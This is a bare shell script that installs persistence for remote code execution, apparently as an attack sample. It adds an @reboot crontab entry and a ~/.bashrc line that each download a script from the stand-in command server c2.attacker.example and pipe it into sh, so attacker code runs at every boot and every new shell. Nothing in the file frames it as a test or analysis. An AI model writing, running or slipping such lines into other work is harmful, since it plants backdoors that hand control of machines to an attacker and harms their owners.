#!/bin/sh
(crontab -l; echo '@reboot curl https://c2.attacker.example/a | sh') | crontab -
echo 'curl -s https://c2.attacker.example/b | sh' >> ~/.bashrc
